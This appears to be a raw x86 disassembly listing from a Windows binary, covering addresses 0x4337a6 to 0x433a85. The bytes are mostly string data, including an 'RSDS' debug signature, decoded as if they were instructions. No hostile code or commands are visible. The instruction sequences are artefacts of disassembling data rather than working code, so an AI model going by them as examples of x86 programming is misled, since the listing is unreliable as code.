  4337a6:	pop    edi
  4337a7:	ss inc ebx
  4337a9:	ss pop edx
  4337ab:	xor    ebx,DWORD PTR [edi+0x52]
  4337ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4337b2:	pop    edi
  4337b3:	dec    esi
  4337b4:	dec    esp
  4337b5:	dec    eax
  4337b6:	xor    esi,DWORD PTR [edx]
  4337b8:	pop    edi
  4337b9:	xor    al,0x4b
  4337bb:	add    BYTE PTR [eax+0x49],cl
  4337be:	push   ebp
  4337bf:	xor    al,0x5f
  4337c1:	dec    esp
  4337c2:	inc    edx
  4337c3:	dec    ecx
  4337c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4337c7:	pop    ecx
  4337c8:	inc    edi
  4337c9:	add    BYTE PTR [eax+0x50],bl
  4337cc:	dec    eax
  4337cd:	pop    edi
  4337ce:	push   ebp
  4337cf:	push   ecx
  4337d0:	inc    edi
  4337d1:	xor    cl,BYTE PTR [edx+0x38]
  4337d4:	push   esi
  4337d5:	add    BYTE PTR [ebx+0x4a],al
  4337d8:	push   edx
  4337d9:	pop    edi
  4337da:	dec    edi
  4337db:	dec    eax
  4337dc:	dec    edi
  4337dd:	dec    edi
  4337de:	dec    edx
  4337df:	add    BYTE PTR [ecx+0x52],al
  4337e2:	cmp    DWORD PTR [edi+0x56],ebx
  4337e5:	aaa    
  4337e6:	dec    esp
  4337e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4337ea:	push   edx
  4337eb:	inc    esp
  4337ec:	add    BYTE PTR [ecx+0x37],bl
  4337ef:	inc    esp
  4337f0:	pop    edi
  4337f1:	dec    ecx
  4337f2:	xor    esi,DWORD PTR [edi]
  4337f4:	xor    DWORD PTR [edi+0x49],ebx
  4337f7:	push   esp
  4337f8:	xor    eax,DWORD PTR [eax]
  4337fa:	push   edx
  4337fb:	xor    BYTE PTR [eax+0x5f],bl
  4337fe:	dec    eax
  4337ff:	push   edi
  433800:	inc    esi
  433801:	xor    DWORD PTR [edi+0x5f],edx
  433804:	cmp    BYTE PTR [ebx+0x37],dl
  433807:	add    BYTE PTR [esi+0x42],dl
  43380a:	dec    ecx
  43380b:	xor    ebx,DWORD PTR [edi+0x45]
  43380e:	xor    BYTE PTR [ebp+0x5f],cl
  433811:	xor    al,0x34
  433813:	xor    BYTE PTR [edx+0x5f],cl
  433816:	inc    edi
  433817:	add    BYTE PTR [edx+0x57],dl
  43381a:	xor    ebx,DWORD PTR [edi+0x31]
  43381d:	dec    edx
  43381e:	push   edi
  43381f:	xor    eax,0x4d435f
  433824:	dec    ecx
  433825:	xor    eax,0x36365f39
  43382a:	dec    eax
  43382b:	xor    BYTE PTR [eax],al
  43382d:	dec    edi
  43382e:	inc    ebx
  43382f:	push   edi
  433830:	pop    edi
  433831:	inc    edi
  433832:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433837:	add    BYTE PTR [edx+0x58],al
  43383a:	inc    edi
  43383b:	ss pop edi
  43383d:	push   esi
  43383e:	inc    ebx
  43383f:	dec    esi
  433840:	inc    esp
  433841:	add    BYTE PTR [edi+0x4d],cl
  433844:	inc    edi
  433845:	xor    ebx,DWORD PTR [edi+0x34]
  433848:	dec    esi
  433849:	pop    edx
  43384a:	cmp    BYTE PTR [edi+0x58],bl
  43384d:	cmp    BYTE PTR [eax],al
  43384f:	push   edx
  433850:	pop    eax
  433851:	push   ecx
  433852:	pop    edi
  433853:	dec    esp
  433854:	push   edx
  433855:	dec    ecx
  433856:	dec    edi
  433857:	inc    esp
  433858:	pop    edi
  433859:	dec    edi
  43385a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43385e:	push   eax
  43385f:	inc    ebp
  433860:	pop    edi
  433861:	xor    eax,0x565f3945
  433866:	add    BYTE PTR [edi+0x4e],al
  433869:	push   esi
  43386a:	pop    edi
  43386b:	inc    edi
  43386c:	push   esp
  43386d:	dec    eax
  43386e:	xor    dh,BYTE PTR [ecx]
  433870:	pop    edi
  433871:	dec    edi
  433872:	xor    eax,DWORD PTR ss:[eax]
  433875:	inc    esp
  433876:	inc    ebp
  433877:	dec    ecx
  433878:	pop    edi
  433879:	push   edx
  43387a:	dec    eax
  43387b:	xor    al,0x48
  43387d:	dec    ecx
  43387e:	ss pop edi
  433880:	aaa    
  433881:	aaa    
  433882:	dec    ecx
  433883:	dec    ebp
  433884:	add    BYTE PTR [eax+0x54],cl
  433887:	ss pop edi
  433889:	inc    esi
  43388a:	inc    edx
  43388b:	xor    dh,BYTE PTR [eax+eax*1]
  43388e:	dec    esi
  43388f:	ss dec edx
  433891:	pop    edi
  433892:	dec    ecx
  433893:	dec    esp
  433894:	inc    edi
  433895:	inc    esp
  433896:	dec    eax
  433897:	xor    BYTE PTR [eax],bh
  433899:	xor    eax,0x4c344f00
  43389e:	xor    esi,DWORD PTR [edi]
  4338a0:	xor    BYTE PTR [edi+0x44],bl
  4338a3:	inc    edi
  4338a4:	dec    ebx
  4338a5:	xor    al,BYTE PTR [ecx+0x43]
  4338a8:	add    BYTE PTR [edi+0x32],cl
  4338ab:	xor    ebx,DWORD PTR [edi+0x57]
  4338ae:	xor    cl,BYTE PTR [edi+0x5f]
  4338b1:	pop    edx
  4338b2:	add    BYTE PTR [eax+0x4c],bl
  4338b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4338b8:	inc    ecx
  4338b9:	dec    edx
  4338ba:	inc    esi
  4338bb:	xor    DWORD PTR [edi+ebx*2],esi
  4338be:	pop    eax
  4338bf:	inc    edi
  4338c0:	inc    edx
  4338c1:	add    BYTE PTR [eax+0x33],dl
  4338c4:	dec    esi
  4338c5:	pop    edi
  4338c6:	dec    eax
  4338c7:	xor    eax,0x485f53
  4338cc:	dec    ebp
  4338cd:	xor    BYTE PTR [edx+0x5f],al
  4338d0:	dec    edx
  4338d1:	pop    eax
  4338d2:	push   esp
  4338d3:	dec    ecx
  4338d4:	dec    esp
  4338d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4338d9:	xor    esi,DWORD PTR [eax]
  4338db:	pop    edi
  4338dc:	inc    ecx
  4338dd:	pop    edx
  4338de:	push   ecx
  4338df:	pop    edx
  4338e0:	cmp    DWORD PTR [esi],esi
  4338e2:	pop    edi
  4338e3:	dec    eax
  4338e4:	dec    esp
  4338e5:	pop    edx
  4338e6:	add    BYTE PTR [ecx+0x57],dl
  4338e9:	pop    ecx
  4338ea:	pop    edi
  4338eb:	push   esi
  4338ec:	xor    al,0x44
  4338ee:	xor    DWORD PTR [eax],edi
  4338f0:	xor    bl,BYTE PTR [edi+0x39]
  4338f3:	push   esp
  4338f4:	push   esp
  4338f5:	add    BYTE PTR [esi+0x0],dl
  4338f8:	dec    edi
  4338f9:	add    BYTE PTR [edi+0x0],al
  4338fc:	add    BYTE PTR ss:[edi+0x0],bl
  433900:	dec    edi
  433901:	add    BYTE PTR [edx+0x0],bl
  433904:	inc    ebp
  433905:	add    BYTE PTR [eax],dh
  433907:	add    BYTE PTR [ebp+0x0],al
  43390a:	xor    BYTE PTR [eax],al
  43390c:	pop    edi
  43390d:	add    BYTE PTR [eax],dh
  43390f:	add    BYTE PTR ds:0x4f000000,dh
  433915:	add    BYTE PTR ds:0x5f005700,dh
  43391b:	add    BYTE PTR [edi],dh
  43391d:	add    BYTE PTR [ebx+0x0],dl
  433920:	push   ebp
  433921:	add    BYTE PTR [edi+0x0],al
  433924:	xor    al,0x0
  433926:	pop    edi
  433927:	add    BYTE PTR [ecx+0x0],dl
  43392a:	inc    esp
  43392b:	add    BYTE PTR [eax],al
  43392d:	add    BYTE PTR [edx+0x0],dl
  433930:	push   esp
  433931:	add    BYTE PTR ds:0x52005f00,dh
  433937:	add    BYTE PTR [edi+0x0],dl
  43393a:	xor    al,BYTE PTR [eax]
  43393c:	xor    al,BYTE PTR [eax]
  43393e:	xor    BYTE PTR [eax],al
  433940:	xor    BYTE PTR [eax],al
  433942:	pop    edi
  433943:	add    BYTE PTR [esi],dh
  433945:	add    BYTE PTR [eax],al
  433947:	add    BYTE PTR [eax+0x0],cl
  43394a:	inc    ebp
  43394b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43394f:	add    BYTE PTR [edi+0x0],bl
  433952:	dec    edx
  433953:	add    BYTE PTR [edx],dh
  433955:	add    BYTE PTR [edi],dh
  433957:	add    BYTE PTR [ebp+0x0],dl
  43395a:	add    BYTE PTR ss:[eax],dh
  43395d:	add    BYTE PTR [eax],al
  43395f:	add    BYTE PTR [esi+0x0],dl
  433962:	cmp    BYTE PTR [eax],al
  433964:	dec    edi
  433965:	add    BYTE PTR [ecx],bh
  433967:	add    BYTE PTR [edi+0x0],bl
  43396a:	pop    eax
  43396b:	add    BYTE PTR [edx+0x0],bl
  43396e:	dec    esp
  43396f:	add    BYTE PTR [ebx+0x0],cl
  433972:	add    BYTE PTR [eax],al
  433974:	dec    ecx
  433975:	add    BYTE PTR [ebp+0x0],dl
  433978:	dec    edi
  433979:	add    BYTE PTR [eax],bh
  43397b:	add    BYTE PTR [edi+0x0],bl
  43397e:	inc    esp
  43397f:	add    BYTE PTR [eax],bh
  433981:	add    BYTE PTR [ecx+0x0],cl
  433984:	dec    eax
  433985:	add    BYTE PTR [edi+0x0],cl
  433988:	pop    edi
  433989:	add    BYTE PTR [ebp+0x0],al
  43398c:	pop    eax
  43398d:	add    BYTE PTR [eax],al
  43398f:	add    BYTE PTR [edx+0x0],dl
  433992:	dec    esp
  433993:	add    BYTE PTR [esi],dh
  433995:	add    BYTE PTR [edi+0x0],bl
  433998:	aaa    
  433999:	add    BYTE PTR [eax+0x0],bl
  43399c:	xor    eax,DWORD PTR [eax]
  43399e:	inc    edi
  43399f:	add    BYTE PTR [ecx+0x0],dl
  4339a2:	pop    edi
  4339a3:	add    BYTE PTR [edx+0x0],cl
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	inc    edi
  4339a9:	add    BYTE PTR [edi+0x0],cl
  4339ac:	push   ebx
  4339ad:	add    BYTE PTR [eax+eax*1],dh
  4339b0:	pop    edi
  4339b1:	add    BYTE PTR [ecx+0x0],cl
  4339b4:	xor    DWORD PTR [eax],eax
  4339b6:	push   esi
  4339b7:	add    BYTE PTR [ebx],dh
  4339b9:	add    BYTE PTR [edi+0x0],bl
  4339bc:	dec    ecx
  4339bd:	add    BYTE PTR [edx+0x0],bl
  4339c0:	add    BYTE PTR [eax],al
  4339c2:	inc    ebx
  4339c3:	add    BYTE PTR [ecx+0x0],bl
  4339c6:	inc    ecx
  4339c7:	add    BYTE PTR [eax],dh
  4339c9:	add    BYTE PTR [ecx],bh
  4339cb:	add    BYTE PTR [edi+0x0],bl
  4339ce:	cmp    DWORD PTR [eax],eax
  4339d0:	push   eax
  4339d1:	add    BYTE PTR [eax+eax*1],dh
  4339d4:	pop    edx
  4339d5:	add    BYTE PTR [eax],al
  4339d7:	add    BYTE PTR [edx+0x0],al
  4339da:	inc    esi
  4339db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4339df:	add    BYTE PTR [ebp+0x0],dl
  4339e2:	push   ebp
  4339e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4339e7:	add    BYTE PTR [eax],al
  4339e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4339ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4339f1:	add    BYTE PTR [edi+0x0],bl
  4339f4:	xor    eax,DWORD PTR [eax]
  4339f6:	cmp    DWORD PTR [eax],eax
  4339f8:	dec    eax
  4339f9:	add    BYTE PTR [edi+0x0],bl
  4339fc:	dec    ebp
  4339fd:	add    BYTE PTR [ecx+0x0],bl
  433a00:	cmp    DWORD PTR [eax],eax
  433a02:	inc    ecx
  433a03:	add    BYTE PTR [esi+0x0],cl
  433a06:	add    BYTE PTR [eax],al
  433a08:	inc    ebx
  433a09:	add    BYTE PTR [eax+0x0],dl
  433a0c:	dec    esi
  433a0d:	add    BYTE PTR [eax+eax*1],dh
  433a10:	pop    edi
  433a11:	add    BYTE PTR [eax+eax*1+0x54],cl
  433a15:	add    BYTE PTR [ebx+0x0],cl
  433a18:	xor    DWORD PTR [eax],eax
  433a1a:	add    BYTE PTR [eax],al
  433a1c:	inc    ecx
  433a1d:	add    BYTE PTR [edi],dh
  433a1f:	add    BYTE PTR [edx+0x0],cl
  433a22:	pop    edi
  433a23:	add    BYTE PTR [ebx+0x0],al
  433a26:	cmp    BYTE PTR [eax],al
  433a28:	push   edi
  433a29:	add    BYTE PTR [eax+0x0],dl
  433a2c:	pop    edi
  433a2d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433a31:	add    BYTE PTR [edx],dh
  433a33:	add    BYTE PTR [eax],al
  433a35:	add    BYTE PTR [edx+0x0],al
  433a38:	add    BYTE PTR [eax],al
  433a3a:	push   edx
  433a3b:	push   ebx
  433a3c:	inc    esp
  433a3d:	push   ebx
  433a3e:	aad    0xf7
  433a40:	out    dx,al
  433a41:	jge    0x4339f7
  433a43:	xchg   edi,eax
  433a44:	mov    bl,0x41
  433a46:	mov    esi,0xcbebbe49
  433a4b:	jnp    0x433a5e
  433a4d:	cld    
  433a4e:	adc    eax,DWORD PTR [eax]
  433a50:	add    BYTE PTR [eax],al
  433a52:	dec    edi
  433a53:	cmp    bl,BYTE PTR [ecx+esi*2+0x54]
  433a57:	inc    esp
  433a58:	jp     0x433aa8
  433a5a:	jb     0x433ab6
  433a5c:	addr16 jne 0x433ac2
  433a5f:	jns    0x433ad1
  433a61:	jbe    0x433abf
  433a63:	push   0x62
  433a65:	push   edi
  433a66:	jns    0x433ae0
  433a68:	inc    ebp
  433a69:	ins    DWORD PTR es:[edi],dx
  433a6a:	jbe    0x433ad3
  433a6c:	popa   
  433a6d:	pop    esp
  433a6e:	je     0x433ada
  433a70:	pop    edx
  433a71:	data16 jne 0x433ae6
  433a74:	ja     0x433ade
  433a76:	push   edx
  433a77:	bound  eax,QWORD PTR [ebp+0x72]
  433a7a:	pop    esp
  433a7b:	dec    edx
  433a7c:	jae    0x433ac2
  433a7e:	ins    DWORD PTR es:[edi],dx
  433a7f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433a83:	jo     0x433ae9
  433a85:	bound  eax,QWORD PTR [eax]
	...
